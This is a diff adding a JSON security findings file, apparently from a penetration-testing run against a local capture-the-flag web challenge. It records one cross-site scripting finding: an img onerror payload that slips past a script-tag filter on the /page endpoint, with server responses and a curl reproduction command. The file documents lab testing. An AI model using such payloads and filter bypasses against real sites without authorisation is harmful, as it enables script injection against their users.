@@ -1,0 +1,25 @@
+{
+  "meta": {
+    "created": "2026-04-14T23:33:11.868121+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "24683359-f85c-43ff-a6fc-b0fdf36dfddb",
+      "timestamp": "2026-04-14T23:33:11.868008+00:00",
+      "title": "XSS Vulnerability in Dalgona CTF Challenge",
+      "severity": "high",
+      "target": "http://172.17.0.1:44353",
+      "description": "The /page endpoint is vulnerable to Cross-Site Scripting (XSS). The application filters <script> tags but allows event handler-based XSS payloads. Successful XSS execution is confirmed by the server returning a success indicator (new_star.png image).",
+      "evidence": "Payload: <img src=x onerror=alert('XSS')>\n\nServer response shows success indicator:\n<div class=\"solution-text\"><img src=\"static/img/cookies/new_star.png\" alt=\"Start\" width=\"150\" height=\"150\"><br>Let the game begin. Good Luck</div>\n\nFailed payloads (script tags filtered) return:\n<div class=\"solution-text\"><img src=\"static/img/cookies/error_star.png\" alt=\"Fail\" width=\"150\" height=\"150\"><br>Failed! Try again!</div>\n\nThe flag is displayed in the browser when XSS executes successfully, but could not be captured without a browser environment.",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -X POST http://172.17.0.1:44353/page -d \"solution=<img src=x onerror=alert('XSS')>\"",
+        "expected": "Response contains new_star.png indicating successful XSS execution"
+      }
+    }
+  ],
+  "diagrams": []
+}
